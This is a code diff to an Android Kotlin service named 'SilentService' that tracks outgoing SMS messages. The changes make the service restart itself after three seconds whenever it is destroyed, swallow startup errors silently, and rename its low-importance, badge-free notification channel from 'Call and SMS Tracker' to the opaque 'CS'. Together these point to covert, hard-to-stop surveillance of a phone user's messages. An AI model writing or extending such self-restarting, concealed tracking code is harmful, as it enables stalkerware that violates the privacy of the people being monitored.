@@ -10,29 +10,36 @@ import android.os.IBinder
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import android.content.pm.ServiceInfo
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.launch
 
 class SilentService : Service() {
     private lateinit var smsReceiver: SmsReceiver
+    private val serviceScope = CoroutineScope(Dispatchers.Main)
 
     override fun onCreate() {
         super.onCreate()
         Log.d("SilentService", "Service started main service-------------")
         createNotificationChannel()
 
-        // Start the service in the foreground
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            // For Android 10 and above, we specify the type of service
-            val notification = createMinimalNotification()
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { // API 33 and above
-                val foregroundServiceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
-                startForeground(1, notification, foregroundServiceType)
+        try {
+            // Start the service in the foreground
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                // For Android 10 and above, we specify the type of service
+                val notification = createMinimalNotification()
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { // API 33 and above
+                    val foregroundServiceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                    startForeground(1, notification, foregroundServiceType)
+                } else {
+                    startForeground(1, notification)
+                }
             } else {
-                startForeground(1, notification)
+                // For older Android versions
+                startForeground(1, createMinimalNotification())
             }
-        } else {
-            // For older Android versions
-            startForeground(1, createMinimalNotification())
-        }
+        } catch (e: Exception) {}
         smsReceiver = SmsReceiver()
         smsReceiver.startOutgoingSmsTracking(this)
     }
@@ -50,21 +57,25 @@ class SilentService : Service() {
         super.onDestroy()
         Log.d("SilentService", "Service destroyed")
 
-            try {
-                val serviceIntent = Intent(this, SilentService::class.java)
-                stopService(serviceIntent)
-            } catch (e: Exception) {}
-
-
-
-            try {
-                val serviceIntent = Intent(this, SilentService::class.java)
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    startForegroundService(serviceIntent)
-                } else {
-                    startService(serviceIntent)
+//            try {
+//                val serviceIntent = Intent(this, SilentService::class.java)
+//                stopService(serviceIntent)
+//            } catch (e: Exception) {}
+//
+           val serviceIntent = Intent(this, SilentService::class.java)
+                serviceScope.launch {
+                    delay(3000) // Delay for 3 seconds
+                    try {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                            startForegroundService(serviceIntent)
+                        } else {
+                            startService(serviceIntent)
+                        }
+                        Log.d("SilentService", "Service destroyed --- start service")
+                    } catch (e: Exception) {}
                 }
-            } catch (e: Exception) {}
+
+
     }
 
 
@@ -72,7 +83,7 @@ class SilentService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "Call and SMS Tracker",
+                "CS",
                 NotificationManager.IMPORTANCE_MIN
             ).apply {
                 setShowBadge(false)
@@ -84,7 +95,7 @@ class SilentService : Service() {
 
     private fun createMinimalNotification(): Notification {
         return NotificationCompat.Builder(this, CHANNEL_ID)
-//            .setSmallIcon(R.drawable.noti) // Use a valid icon here
+            .setSmallIcon(R.drawable.noti) // Use a valid icon here
             .setContentTitle("Tracking Calls and Messages")
             .setContentText("Tracking calls and messages in the background.")
             .setOngoing(true)
